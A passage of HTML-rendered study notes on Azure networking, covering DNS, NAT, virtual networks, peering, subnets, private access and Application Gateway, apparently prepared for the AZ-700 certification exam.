<tr><td>Header Complexity</td><td>More complex</td><td>Simplified</td></tr>
<tr><td>Configuration</td><td>Manual or DHCP</td><td>Auto-configuration (stateless)</td></tr>
<tr><td>Security</td><td>Optional (IPsec)</td><td>Mandatory (IPsec)</td></tr>
</tbody>
</table>
</div>
<p>IPv4 and IPv6 are both critical for networking, with IPv6 designed to overcome the limitations of IPv4 and ensure the continued growth and scalability of the internet.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-dns"><a class="header" href="#azure-dns">Azure DNS</a></h1>
<h2 id="definition"><a class="header" href="#definition">Definition</a></h2>
<p>Azure DNS is a cloud-based Domain Name System (DNS) service provided by Microsoft Azure. It allows you to host your DNS domains alongside your Azure resources, enabling you to manage DNS records using the same credentials, APIs, tools, and billing as your other Azure services.</p>
<h2 id="key-features-1"><a class="header" href="#key-features-1">Key Features</a></h2>
<ol>
<li>
<p><strong>Global Reach:</strong></p>
<ul>
<li>Azure DNS uses a global network of name servers to provide fast DNS responses and high availability.</li>
<li>DNS queries are answered from the closest DNS server to the end user.</li>
</ul>
</li>
<li>
<p><strong>DNS Zones:</strong></p>
<ul>
<li>Host your DNS domain in Azure DNS by creating a DNS zone.</li>
<li>A DNS zone is used to manage the DNS records for a specific domain.</li>
</ul>
</li>
<li>
<p><strong>DNS Records:</strong></p>
<ul>
<li>Support for all common DNS record types, including A, AAAA, CNAME, MX, NS, PTR, SOA, SRV, and TXT.</li>
<li>Manage records through the Azure portal, Azure CLI, Azure PowerShell, and REST API.</li>
</ul>
</li>
<li>
<p><strong>Alias Records:</strong></p>
<ul>
<li>Alias records allow you to map DNS names to Azure resources like Azure Traffic Manager, public IP addresses, and Azure Content Delivery Network (CDN) endpoints.</li>
<li>Automatically update DNS records when the underlying Azure resources change.</li>
</ul>
</li>
<li>
<p><strong>Integration with Azure Services:</strong></p>
<ul>
<li>Seamlessly integrate with other Azure services for dynamic DNS updates and automated DNS management.</li>
<li>Use Azure Private DNS for internal domain name resolution within your Azure virtual networks.</li>
</ul>
</li>
<li>
<p><strong>Security:</strong></p>
<ul>
<li>DNS queries are secured with DNSSEC (DNS Security Extensions) to protect against spoofing and cache poisoning.</li>
<li>Role-Based Access Control (RBAC) to manage permissions and access to DNS zones and records.</li>
</ul>
</li>
<li>
<p><strong>Scalability:</strong></p>
<ul>
<li>Azure DNS is designed to handle large-scale DNS workloads.</li>
<li>Scalable to meet the needs of high-traffic domains.</li>
</ul>
</li>
<li>
<p><strong>Monitoring and Analytics:</strong></p>
<ul>
<li>Monitor DNS queries and traffic patterns using Azure Monitor.</li>
<li>View detailed metrics and logs for DNS performance and availability.</li>
</ul>
</li>
</ol>
<h2 id="best-practices"><a class="header" href="#best-practices">Best Practices</a></h2>
<ol>
<li>
<p><strong>Zone Management:</strong></p>
<ul>
<li>Use descriptive names for DNS zones to clearly identify their purpose.</li>
<li>Organize DNS zones to reflect the structure of your organization or application.</li>
</ul>
</li>
<li>
<p><strong>Record Management:</strong></p>
<ul>
<li>Use alias records to simplify DNS management for Azure resources.</li>
<li>Regularly review and update DNS records to ensure accuracy.</li>
</ul>
</li>
<li>
<p><strong>Security:</strong></p>
<ul>
<li>Implement DNSSEC to enhance the security of your DNS infrastructure.</li>
<li>Use RBAC to control access to DNS zones and records.</li>
</ul>
</li>
<li>
<p><strong>Monitoring:</strong></p>
<ul>
<li>Enable monitoring and logging for DNS zones to detect and troubleshoot issues.</li>
<li>Set up alerts for unusual DNS activity or changes in traffic patterns.</li>
</ul>
</li>
</ol>
<h2 id="use-cases-3"><a class="header" href="#use-cases-3">Use Cases</a></h2>
<ul>
<li><strong>Hosting DNS Domains:</strong> Manage DNS records for your domains within Azure.</li>
<li><strong>Internal Domain Resolution:</strong> Use Azure Private DNS for internal name resolution within virtual networks.</li>
<li><strong>Application Delivery:</strong> Optimize DNS routing with Azure Traffic Manager for high availability and performance.</li>
<li><strong>Automated DNS Management:</strong> Integrate with Azure services for dynamic DNS updates and automation.</li>
</ul>
<p>Azure DNS provides a reliable and scalable DNS service that simplifies domain management and integrates seamlessly with your Azure infrastructure.</p>
<h2 id="internal-private-name-resolution-scenarios-and-options"><a class="header" href="#internal-private-name-resolution-scenarios-and-options">Internal (Private) Name Resolution Scenarios and Options</a></h2>
<ul>
<li>
<p>Scenarios:</p>
<ul>
<li><strong>Name Resolution within a Virtual Network:</strong> Resolve names of resources within the same virtual network.</li>
<li><strong>Name Resolution between Virtual Networks:</strong> Resolve names of resources across different virtual networks.</li>
<li><strong>Name Resolution between On-Premises and Azure:</strong> Resolve names of resources between on-premises networks and Azure virtual networks.</li>
</ul>
</li>
<li>
<p>Options:</p>
<ul>
<li>
<p><strong>Azure-provided DNS:</strong> Use Azure-provided DNS for name resolution within a virtual network.</p>
<ul>
<li>This is the default when you create a virtual network in Azure. Anytime you create a vNet in Azure, the platform configures it to use this option and assigns a unique private DNS suffix to it in the <autogenerated random-id="">.internal.cloudapp.net format. Azure‚Äôs DHCP will assign this DNS suffix to any resource that obtains an IP address.</autogenerated></li>
<li>The default Azure provided DNS Server uses a virtual IP address of 168.63.129.16. This server limits each client to 1000 queries per second. Anything above this is throttled.</li>
<li>This option can only cover scenario 1 above (Name Resolution within a Virtual Network).</li>
<li>This option does not support WINS or NetBios.</li>
<li>We cannot enable or configure logging within this option.</li>
</ul>
</li>
<li>
<p><strong>Custom DNS:</strong> Configure custom DNS servers for name resolution within a virtual network.</p>
<ul>
<li>You can host your own DNS server and forward name resolution requests to it.</li>
</ul>
</li>
<li>
<p><strong>Azure Private DNS:</strong> Use Azure Private DNS for name resolution between virtual networks and on-premises networks.</p>
<ul>
<li>Azure Private DNS provides a reliable, secure DNS service to manage and resolve domain names in a virtual network without the need for a custom DNS solution.</li>
<li>This service can be used to create forward and reverse DNS zones (up to a max of 1000 per subscription).</li>
<li>An Azure Private DNS Zone can contain up to 25000 record sets, and supports all common record types.</li>
<li>After you create a Private DNS zone, it must be ‚Äòlinked‚Äô to a vNet.</li>
<li>When linking a Private DNS Zone to a vNet, you can choose to enable auto-registration of virtual machines in the vNet to the DNS zone. This will automatically register the VM‚Äôs hostname and IP address in the DNS zone.</li>
<li>A virtual network can be linked to multiple private DNS zones, but it can only be linked to one private DNS zone with auto-registration enabled.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="public-name-resolution-scenarios-and-options"><a class="header" href="#public-name-resolution-scenarios-and-options">Public Name Resolution Scenarios and Options</a></h2>
<ul>
<li>Scenarios:
<ul>
<li><strong>Name Resolution for Internet Clients:</strong> Resolve names of resources for clients on the internet.</li>
</ul>
</li>
<li>Options:
<ul>
<li><strong>Azure DNS:</strong> Use Azure DNS for public name resolution.
<ul>
<li>Azure DNS is a cloud-based DNS service that hosts your DNS domains and provides name resolution for internet clients.</li>
<li>You can manage DNS records for your domains using Azure DNS and integrate it with other Azure services.</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-virtual-network-nat"><a class="header" href="#azure-virtual-network-nat">Azure Virtual Network NAT</a></h1>
<ul>
<li>Azure Virtual Network NAT (Network Address Translation) is a service that enables outbound connectivity for virtual networks. It allows virtual machines (VMs) in a virtual network to access the internet without public IP addresses. NAT simplifies outbound connectivity for VMs by translating their private IP addresses to a public IP address.</li>
</ul>
<h3 id="azure-virtual-network-nat-provides-the-following-key-features-and-benefits"><a class="header" href="#azure-virtual-network-nat-provides-the-following-key-features-and-benefits">Azure Virtual Network NAT provides the following key features and benefits:</a></h3>
<ul>
<li><strong>Outbound Connectivity</strong>: NAT enables VMs in a virtual network to access the internet for software updates, package downloads, and other external services without requiring public IP addresses on the VMs themselves.</li>
<li><strong>Security</strong>: NAT helps secure your virtual network by hiding the private IP addresses of VMs from external sources. Only the public IP address of the NAT gateway is exposed to the internet.</li>
<li><strong>Cost-Effective</strong>: NAT reduces the need for public IP addresses on individual VMs, which can help lower costs associated with IP address management.</li>
<li><strong>Scalability</strong>: NAT can handle high volumes of outbound traffic from multiple VMs in a virtual network, providing scalable outbound connectivity for your applications.</li>
<li><strong>Ease of Management</strong>: NAT simplifies outbound connectivity configuration by providing a centralized service for translating private IP addresses to a public IP address.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="subnets"><a href="#subnets" class="header">Subnets</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="virtual-machine-scale-sets"><a class="header" href="#virtual-machine-scale-sets">Virtual Machine Scale Sets</a></h1>
<p>Azure Virtual Machine Scale Sets offer a robust and flexible solution for deploying, managing, and scaling applications, ensuring high availability and optimal performance to meet varying demands.</p>
<h2 id="overview"><a class="header" href="#overview">Overview</a></h2>
<ul>
<li>Used to create and manage a group of identical, load balanced VMs</li>
<li>Traffic will be distributed to the VM instances via a load balancer service</li>
<li>VM instances are managed by a single Azure Resource Manager template</li>
<li>VM instances can be automatically scaled in or out based on demand or a defined schedule</li>
<li>VM instances can be automatically healed if they become unhealthy</li>
<li>VM instances can be automatically updated with the latest OS image</li>
<li>VM instances can be automatically deployed across multiple fault domains and update domains</li>
<li>VM instances can be automatically deployed across multiple regions</li>
<li>VM instances can be automatically deployed across multiple availability zones</li>
</ul>
<h2 id="use-cases-4"><a class="header" href="#use-cases-4">Use Cases</a></h2>
<ul>
<li>Web front ends</li>
<li>API services</li>
<li>Batch processing</li>
<li>Containers</li>
<li>Microservices</li>
</ul>
<h2 id="components"><a class="header" href="#components">Components</a></h2>
<ul>
<li><strong>Scale Set</strong>: The group of identical VM instances</li>
<li><strong>Load Balancer</strong>: Distributes traffic to the VM instances</li>
<li><strong>Health Probe</strong>: Monitors the health of the VM instances</li>
<li><strong>Scale Out</strong>: Increases the number of VM instances</li>
<li><strong>Scale In</strong>: Decreases the number of VM instances</li>
<li><strong>Auto Scale</strong>: Automatically scales the number of VM instances based on demand or a defined schedule</li>
<li><strong>Auto Heal</strong>: Automatically heals unhealthy VM instances</li>
<li><strong>Auto Update</strong>: Automatically updates the OS image of the VM instances</li>
<li><strong>Fault Domain</strong>: A group of VM instances that share a common power source and network switch</li>
<li><strong>Update Domain</strong>: A group of VM instances that are updated together</li>
</ul>
<h2 id="pricing-3"><a class="header" href="#pricing-3">Pricing</a></h2>
<ul>
<li>Pay only for the VM instances that are running</li>
<li>No additional charge for the scale set service</li>
<li>No additional charge for the load balancer service</li>
<li>No additional charge for the health probe service</li>
</ul>
<h2 id="scaling"><a class="header" href="#scaling">Scaling</a></h2>
<ul>
<li><strong>Manual Scaling</strong>: Increase or decrease the number of VM instances manually</li>
<li><strong>Auto Scaling</strong>: Automatically increase or decrease the number of VM instances based on demand or a defined schedule</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-virtual-network-vnet"><a class="header" href="#azure-virtual-network-vnet">Azure Virtual Network (VNet)</a></h1>
<p>TOC</p>
<h2 id="introduction-23"><a class="header" href="#introduction-23">Introduction</a></h2>
<p><strong>Definition:</strong></p>
<ul>
<li>Azure Virtual Network (VNet) is a fundamental component of Microsoft Azure, allowing you to create private networks within the Azure cloud. These networks can be isolated or connected to on-premises data centers, providing a flexible and secure environment for deploying and managing resources. Azure Virtual Network provides the flexibility, security, and scalability needed to build robust cloud-based network infrastructures, supporting a wide range of applications and services.</li>
</ul>
<h2 id="key-features-2"><a class="header" href="#key-features-2">Key Features:</a></h2>
<ol>
<li>
<p><strong>Isolation and Segmentation:</strong></p>
<ul>
<li>Create isolated networks for your resources.</li>
<li>Use subnets to segment the VNet into smaller address spaces for organization and security.</li>
</ul>
</li>
<li>
<p><strong>Security:</strong></p>
<ul>
<li>Implement Network Security Groups (NSGs) to control inbound and outbound traffic.</li>
<li>Use Azure Firewall for advanced network security.</li>
</ul>
</li>
<li>
<p><strong>Connectivity:</strong></p>
<ul>
<li>Connect VNets to each other using VNet peering.</li>
<li>Link your VNet to on-premises networks using VPN Gateway or ExpressRoute.</li>
<li>Enable secure connections to the internet or other Azure services.</li>
</ul>
</li>
<li>
<p><strong>Scalability and Availability:</strong></p>
<ul>
<li>Scale your network by adding or resizing subnets.</li>
<li>Ensure high availability with Azure‚Äôs global infrastructure.</li>
</ul>
</li>
<li>
<p><strong>Integration with Azure Services:</strong></p>
<ul>
<li>Seamlessly integrate with Azure services like Azure Kubernetes Service (AKS), Azure App Service, and Azure Storage.</li>
<li>Use service endpoints to secure your Azure services within your VNet.</li>
</ul>
</li>
<li>
<p><strong>DNS and Customization:</strong></p>
<ul>
<li>Customize DNS settings for your VNet.</li>
<li>Use Azure-provided DNS or bring your own DNS servers.</li>
</ul>
</li>
<li>
<p><strong>Monitoring and Troubleshooting:</strong></p>
<ul>
<li>Monitor network performance and security with Azure Monitor and Network Watcher.</li>
<li>Diagnose and troubleshoot network issues efficiently.</li>
</ul>
</li>
</ol>
<h2 id="use-cases-5"><a class="header" href="#use-cases-5">Use Cases:</a></h2>
<ul>
<li>Deploying multi-tier applications with web, application, and database layers.</li>
<li>Extending on-premises networks to the cloud.</li>
<li>Isolating development, testing, and production environments.</li>
<li>Ensuring secure access to Azure services.</li>
<li>In addition to virtual machines, we can deploy more than 32 other services in a VNet.</li>
<li>Native internal TCP/UDP load balancing and proxy systems for internal HTTP/s load balancing.</li>
<li>Connect to on-premises networks to form hybrid network architectures.</li>
</ul>
<h2 id="differences-between-vnet-and-on-premises-network"><a class="header" href="#differences-between-vnet-and-on-premises-network">Difference‚Äôs between vNet and On-premises network:</a></h2>
<ul>
<li>
<p>Azure vNets do not support layer 2 semantics (only layer-3 and layer-4). This means that concepts such as vLANs and layer-2 broadcast/multicast are not supported. Running <code>arp -a</code> on a VM in Azure will show that MAC address resolution for VMs in the same subnet results in th esame <code>12:34:56:78:9a:bc</code> value. This is because we are on a shared platoform and the vNet is a layer-3 construct.
<img src="clouds/azure/az700/images/arp.png" alt=""></p>
</li>
<li>
<p>Some protocols and communication types are restricted from being used in Azure vNets. Protocols such as multicast, broadcast, DHCP Unicast, UDP source port 65330, IP-in-IP encapsulated packets, and GRE are not supported.</p>
</li>
</ul>
<h2 id="vnet-naming"><a class="header" href="#vnet-naming">vNet Naming</a></h2>
<ul>
<li>You can have two vNets in an Azure subscription with the same name as long as they are in different resource groups.</li>
</ul>
<h2 id="address-spaces"><a class="header" href="#address-spaces">Address Spaces</a></h2>
<ul>
<li>When creating a VNet, you must specify an address space. This address space is a range of IP addresses that can be used by the resources in the VNet.</li>
<li>The address space can be either IPv4 or IPv6. However, a vNet cannot be IPv6 only.</li>
<li>You can create multiple address spaces in a vNet.</li>
<li>Though, you can use any address space, it is recommended to use a private address space as defined in RFC 1918. (10.0.0.0/8, 172.16.0.0/12, or 192.168.0.0/16)</li>
<li>You cannot peer vNets with overlapping address spaces.</li>
</ul>
<h2 id="peering"><a class="header" href="#peering">Peering</a></h2>
<ul>
<li>vNET peering allows us to transfer data between vNETs within and across Azure Subscriptions.</li>
<li>Connect VNETs together using the Azure backbone network so that resources within the subnets can ‚Äòtalk‚Äô to each other</li>
<li>VNETs with overlapping address spaces cannot be peered</li>
<li>vNET peering is easy to implement, no additional infrastructure is required. Peering can be setup between vNETs within minutes.</li>
<li>To implement the peering connection, the Network Contributor role or a custom role with the following permissions is required for both the source and destination vNETs:
<ul>
<li>Microsoft.Network/virtualNetworks/peer/action</li>
<li>Microsoft.Network/virtualNetworks/virtualNetworkPeerings/write</li>
<li>Microsoft.Network/virtualNetworks/virtualNetworkPeerings/read</li>
</ul>
</li>
<li>vNET peering is not transitive. If vNET A is peered with vNET B and vNET B is peered with vNET C, vNET A and vNET C are not peered.</li>
</ul>
<h2 id="connection-vnets-using-a-vpn-gateway"><a class="header" href="#connection-vnets-using-a-vpn-gateway">Connection vNETs using a VPN Gateway</a></h2>
<ul>
<li>In addition to peering, another option for connecting vNETs is to use a VPN Gateway connection.</li>
<li>This option uses an Azure VPN Gateway to create a secure IPSec/IKE tunnel to the target network.</li>
<li>Unlike peering, traffic is routed over the public internet and not the Azure backbone network.</li>
<li>Deploying the VPN Gateway takes around 40 minutes.</li>
<li>When implementing the VPN Gateway to connect two vNETs, there are two connection types that we can use:
<ul>
<li>vNET-to-vNET: Connects two vNETs in the same Azure Subscription.</li>
<li>Site-to-Site: Connects two vNETs in different Azure Subscriptions</li>
</ul>
</li>
<li>You can use this option to connect vNETs with overlapping address spaces by configuring NAT rules on the VPN Gateway</li>
</ul>
<h2 id="vwan-hub"><a class="header" href="#vwan-hub">vWAN Hub</a></h2>
<p><a href="#azure-virtual-wan">vWAN Notes</a></p>
<h3 id="comparing-vnet-peering-vs-vpn-gateway-vs-vwan-hub"><a class="header" href="#comparing-vnet-peering-vs-vpn-gateway-vs-vwan-hub">Comparing vNET Peering vs. VPN Gateway vs. vWAN Hub</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Feature</th><th>Peering</th><th>VNET Gateway</th><th>vWAN Hub</th></tr>
</thead>
<tbody>
<tr><td><strong>Definition</strong></td><td>Direct connection between VNets</td><td>Connection using a VPN gateway</td><td>Connection via Virtual WAN Hub</td></tr>
<tr><td><strong>Use Case</strong></td><td>Low latency, high-speed connection within the same region</td><td>Secure cross-region or hybrid connectivity</td><td>Scalable, centralized management of large-scale network architecture</td></tr>
<tr><td><strong>Bandwidth</strong></td><td>Up to 10 Gbps</td><td>Dependent on gateway SKU</td><td>Up to 20 Gbps (depending on the hub scale)</td></tr>
<tr><td><strong>Latency</strong></td><td>Low</td><td>Higher due to encryption</td><td>Variable, generally higher than peering</td></tr>
<tr><td><strong>Encryption</strong></td><td>Not supported</td><td>Supported</td><td>Supported</td></tr>
<tr><td><strong>Routing</strong></td><td>Manual configuration</td><td>Supports BGP, more complex routing</td><td>Simplified with centralized control</td></tr>
<tr><td><strong>Cost</strong></td><td>Lower, based on data transfer</td><td>Higher, based on gateway and data transfer</td><td>Variable, based on hub and data transfer</td></tr>
<tr><td><strong>Scalability</strong></td><td>Limited to same region</td><td>Cross-region, but limited by gateway scale</td><td>Highly scalable for global networks</td></tr>
<tr><td><strong>Security</strong></td><td>Less secure, no encryption</td><td>More secure with encryption</td><td>High security with built-in features</td></tr>
<tr><td><strong>Complexity</strong></td><td>Simple to configure</td><td>Moderate complexity</td><td>High complexity, but with centralized management tools</td></tr>
<tr><td><strong>Cross-Subscription</strong></td><td>Supported</td><td>Supported</td><td>Supported</td></tr>
<tr><td><strong>Cross-Tenant</strong></td><td>Not supported</td><td>Not supported</td><td>Supported</td></tr>
<tr><td><strong>Redundancy</strong></td><td>Depends on setup</td><td>High availability supported</td><td>High availability and redundancy supported</td></tr>
<tr><td><strong>Additional Features</strong></td><td>Supports private endpoints and service chaining</td><td>Supports VPN, ExpressRoute</td><td>Integrated with Azure Firewall, Application Gateway, etc.</td></tr>
</tbody>
</table>
</div>
<hr>
<h1 id="azure-subnets"><a class="header" href="#azure-subnets">Azure Subnets</a></h1>
<h2 id="definition-1"><a class="header" href="#definition-1">Definition</a></h2>
<p>Azure subnets are subdivisions of an Azure Virtual Network (VNet). They help organize and secure your Azure resources by segmenting the VNet into smaller, manageable sections.</p>
<h2 id="key-features-1-1"><a class="header" href="#key-features-1-1">Key Features</a></h2>
<ol>
<li>
<p><strong>IP Address Range:</strong></p>
<ul>
<li>Each subnet must have a unique IP address range within the VNet.</li>
<li>The address range is defined in CIDR notation (e.g., 10.0.0.0/24).</li>
</ul>
</li>
<li>
<p><strong>Network Security:</strong></p>
<ul>
<li>Use Network Security Groups (NSGs) to control inbound and outbound traffic at the subnet level.</li>
<li>NSGs can be associated with one or more subnets, defining security rules for the subnet.</li>
</ul>
</li>
<li>
<p><strong>Routing:</strong></p>
<ul>
<li>Subnets can have custom route tables associated with them.</li>
<li>Custom routes can direct traffic to specific network appliances or on-premises networks.</li>
</ul>
</li>
<li>
<p><strong>Service Endpoints:</strong></p>
<ul>
<li>Enable service endpoints to secure Azure service resources (like Azure Storage or Azure SQL Database) to your VNet.</li>
<li>Traffic to these services can remain within the Azure backbone network.</li>
</ul>
</li>
<li>
<p><strong>Integration with Azure Services:</strong></p>
<ul>
<li>Subnets can host various Azure resources, such as Virtual Machines (VMs), Azure Kubernetes Service (AKS), and App Service Environments (ASE).</li>
<li>Subnets can be part of an Azure Availability Zone, enhancing resilience and availability.</li>
<li>A full list of services that support vNet integration can be found here: 
<a href="https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-service-endpoints-overview#services-that-support-virtual-network-service-endpoints">Azure Services that support vNet Integration</a></li>
</ul>
</li>
<li>
<p><strong>Subnet Delegation:</strong></p>
<ul>
<li>Delegate a subnet to specific Azure services to simplify network configuration and management.</li>
<li>Examples of delegatable services include Azure Container Instances and Azure App Service.</li>
</ul>
</li>
<li>
<p><strong>Subnet Peering:</strong></p>
<ul>
<li>Use VNet peering to connect subnets across different VNets, allowing resources to communicate securely.</li>
<li>Peered VNets can be within the same region or across different Azure regions (Global VNet Peering).</li>
</ul>
</li>
</ol>
<h2 id="best-practices-1"><a class="header" href="#best-practices-1">Best Practices</a></h2>
<ol>
<li>
<p><strong>Designing Subnets:</strong></p>
<ul>
<li>Plan subnets based on application tiers (e.g., web, application, database) to improve security and manageability.</li>
<li>Ensure enough IP addresses in each subnet to accommodate future growth.</li>
</ul>
</li>
<li>
<p><strong>Security:</strong></p>
<ul>
<li>Apply NSGs at both the subnet and network interface level for layered security.</li>
<li>Regularly review and update NSG rules to maintain optimal security.</li>
</ul>
</li>
<li>
<p><strong>Monitoring and Management:</strong></p>
<ul>
<li>Use Azure Monitor and Network Watcher to monitor subnet performance and diagnose network issues.</li>
<li>Implement logging for NSGs to track and analyze network traffic.</li>
</ul>
</li>
<li>
<p><strong>IP Address Management:</strong></p>
<ul>
<li>Avoid overlapping IP address ranges when peering VNets.</li>
<li>Use private IP ranges for subnets to ensure secure and efficient routing within Azure.</li>
</ul>
</li>
</ol>
<h2 id="use-cases-1-1"><a class="header" href="#use-cases-1-1">Use Cases</a></h2>
<ul>
<li><strong>Isolating Resources:</strong> Segregate different types of workloads or environments (development, testing, production) within a VNet using NSGs.</li>
<li><strong>Enhanced Security:</strong> Apply NSGs to subnets for controlling traffic flow and securing resources.</li>
<li><strong>Network Organization:</strong> Organize resources logically within a VNet for better management and scalability.</li>
<li><strong>Service Integration:</strong> Securely connect Azure services to your VNet using service endpoints or private link.</li>
</ul>
<h2 id="facts"><a class="header" href="#facts">Facts</a></h2>
<ul>
<li>A vNet can have up to 3000 subnets</li>
<li>Azure reserves 5 IP addreses within each subnet for system use. These addresses cannot be used. The first four and the last IP address cannot be allocated to a resource.
<ul>
<li>The first IP address is the network address.</li>
<li>The last IP address is the broadcast address.</li>
<li>The next three IP addresses are reserved for Azure services. (Default Gateway and 2 DNS Servers)</li>
</ul>
</li>
<li>If you need to modify the address space of a subnet that already has resources in it, you must first remove all resources from the subnet.</li>
</ul>
<p>Azure subnets are essential for structuring your VNet, ensuring security, and managing resources efficiently within your Azure environment.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="design-and-implement-private-access"><a class="header" href="#design-and-implement-private-access">Design-and-implement-private-access</a></h1>
<h2 id="directory-map-6"><a class="header" href="#directory-map-6">Directory Map</a></h2>
<ul>
<li><a href="#private-link">private-link</a></li>
<li><a href="#azure-service-endpoint">service-endpoints</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="private-link"><a class="header" href="#private-link">Private Link</a></h1>
<p>A Private Link in Azure is a network interface that connects you privately and securely to a service powered by Azure Private Link. Here are the key points about private endpoints:</p>
<ul>
<li>Private Link/private endpoints offer an advantage over the service endpoint option. On-premises networks can access platform services privately over a ExpressRoute or VPN connection through the private endpoint. Service endpoints do not offer this capability.</li>
<li>If we have implemented a virtual WAN architecture, private endpoints can only be deployed on spoke virtual networks connected to the virtual hub. Implementing private endpoints directly on the virtual hub is not supported.</li>
<li>Supported Azure services can be accessed over private endpoints, but you need to register those private endpoint records in a corresponding private DNS zone.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-service-endpoint"><a class="header" href="#azure-service-endpoint">Azure Service Endpoint</a></h1>
<h2 id="overview-1"><a class="header" href="#overview-1">Overview</a></h2>
<p>Azure Service Endpoint is a feature that provides direct connectivity from a virtual network to Azure services. It extends the identity of your virtual network to the Azure services over a direct connection. The traffic to the Azure service always remains on the Microsoft Azure backbone network. Service Endpoints are not supported across different AD tenants for most services, except for Azure Storage and Azure Key Vault.</p>
<h2 id="service-endpoint-policy"><a class="header" href="#service-endpoint-policy">Service Endpoint Policy</a></h2>
<p>Service Endpoint Policies allow us to control the Azure Service that will be reachable via a Service Endpoint. They provide an additional layer of security to ensure that a service endpoint cannot be used to access all instances of a resource type. For example, if we have a Microsoft.Storage service endpoint on a subnet, we can create a Service Endpoint Policy to allow access to only a specific storage account. Without the policy, the service endpoint can be used to access all storage accounts in the region.</p>
<ul>
<li>Currently, only the Microsoft.Storage provider is compatible with Service Endpoint Policies.</li>
<li>We can scope access to one of three options:
<ul>
<li>All storage accounts in the subscription</li>
<li>All storage accounts in a specific resource group</li>
<li>A specific storage account</li>
</ul>
</li>
</ul>
<h2 id="example-usage"><a class="header" href="#example-usage">Example Usage</a></h2>
<ol>
<li>Create a Service Endpoint Policy</li>
<li>Associate the Service Endpoint Policy with a subnet</li>
</ol>
<p><img src="clouds/azure/az700/images/service-endpoint-policy.png" alt="Service Endpoint Policy"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="design-and-implement-routing"><a class="header" href="#design-and-implement-routing">Design-and-implement-routing</a></h1>
<h2 id="directory-map-7"><a class="header" href="#directory-map-7">Directory Map</a></h2>
<ul>
<li><a href="#application-gateway">application-gateway</a></li>
<li><a href="#azure-availability-sets">availability-sets</a></li>
<li><a href="#azure-front-door">front-door</a></li>
<li><a href="#azure-load-balancer">load-balancer</a></li>
<li><a href="#azure-virtual-network-routing">routing</a></li>
<li><a href="#traffic-manager">traffic-manager</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="application-gateway"><a class="header" href="#application-gateway">Application Gateway</a></h1>
<h2 id="overview-2"><a class="header" href="#overview-2">Overview</a></h2>
<ul>
<li>An Azure Application Gateway is a regional web traffic load balancer that enables you to manage traffic to your web applications. It provides various layer 7 load balancing capabilities for your applications, including SSL termination, cookie-based session affinity, URL-based routing, and multi-site routing. Here are the key features and benefits of Azure Application Gateway:</li>
<li><strong>Layer 7 Load Balancing</strong>: Application Gateway operates at the application layer (layer 7) of the OSI model, allowing you to route traffic based on URL paths or hostnames.</li>
<li><strong>SSL Termination</strong>: Application Gateway can terminate SSL connections, offloading the SSL decryption/encryption process from your web servers.</li>
<li><strong>Cookie-Based Session Affinity</strong>: Application Gateway supports cookie-based session affinity, ensuring that client requests are directed to the same backend server for the duration of a session.</li>
<li><strong>URL-Based Routing</strong>: You can configure Application Gateway to route traffic based on URL paths, enabling you to direct requests to different backend pools based on the URL.</li>
<li><strong>Multi-Site Routing</strong>: Application Gateway supports routing traffic to multiple websites hosted on the same set of backend servers, allowing you to host multiple sites on a single set of servers.</li>
<li><strong>Web Application Firewall (WAF)</strong>: Application Gateway includes a Web Application Firewall (WAF) that provides protection against common web vulnerabilities and attacks, such as SQL injection and cross-site scripting.</li>
</ul>
<h2 id="use-cases-6"><a class="header" href="#use-cases-6">Use Cases</a></h2>
<ul>
<li><strong>Web Application Load Balancing</strong>: Application Gateway is commonly used to distribute traffic across multiple web servers hosting web applications.</li>
<li><strong>SSL Offloading</strong>: By terminating SSL connections at the gateway, Application Gateway can reduce the load on backend servers and improve performance.</li>
<li><strong>Session Affinity</strong>: Cookie-based session affinity ensures that client requests are consistently directed to the same backend server, maintaining session state.</li>
<li><strong>URL-Based Routing</strong>: Application Gateway can route traffic based on URL paths, enabling you to direct requests to specific backend pools based on the U.</li>
</ul>
<h2 id="components-1"><a class="header" href="#components-1">Components</a></h2>
<ul>
<li>
<p><strong>Frontend IP Configuration</strong>: Defines the public IP address and port used to access the Application Gateway.</p>
</li>
<li>
<p><strong>Backend Target</strong>:</p>
<ul>
<li>Backend Pool: Contains the backend servers that receive the traffic from the Application Gateway. Consists of Azure VMs, VMSS‚Äô Azure Web Apps, or one-premises servers.</li>
<li>Redirection: Redirects traffic to a external site or a listener.
<ul>
<li>An external site refers to an endpoint outside of the application gateway. -</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>HTTP Settings</strong>: Define how the Application Gateway communicates with the backend servers, including port, protocol, and cookie settings.</p>
</li>
<li>
<p><strong>HTTP Listener</strong>: Listens for incoming HTTP/HTTPS traffic and routes it to the appropriate backend pool based on the URL path or hostname.</p>
</li>
<li>
<p><strong>URL Path-Based Routing Rules</strong>: Define rules that route traffic to different backend pools based on the URL path.</p>
</li>
</ul>
<h2 id="deployment"><a class="header" href="#deployment">Deployment</a></h2>
<ul>
<li>Application Gateway must be deployed into an empty subnet within a virtual network.</li>
<li>You can create an Application Gateway using the Azure portal, Azure PowerShell, Azure CLI, or ARM templates.</li>
</ul>
<h2 id="tiers"><a class="header" href="#tiers">Tiers</a></h2>
<ul>
<li><strong>Standard</strong>: Offers additional features such as autoscaling, SSL offloading
<ul>
<li>The standard tier offers 3 size options: Small, Medium, and Large</li>
</ul>
</li>
<li><strong>WAF</strong>: Provides protection against common web vulnerabilities and attacks.
<ul>
<li>The WAF tier offers 2 size options: Medium and Large</li>
</ul>
</li>
</ul>
<h2 id="waf"><a class="header" href="#waf">WAF</a></h2>
<ul>
<li>The Web Application Firewall (WAF) feature of Application Gateway provides centralized protection for your web applications from common web-based attacks.</li>
<li>WAF uses OWASP (Open Web Application Security Project) rules to protect against threats such as SQL injection, cross-site scripting, and remote file inclusion.</li>
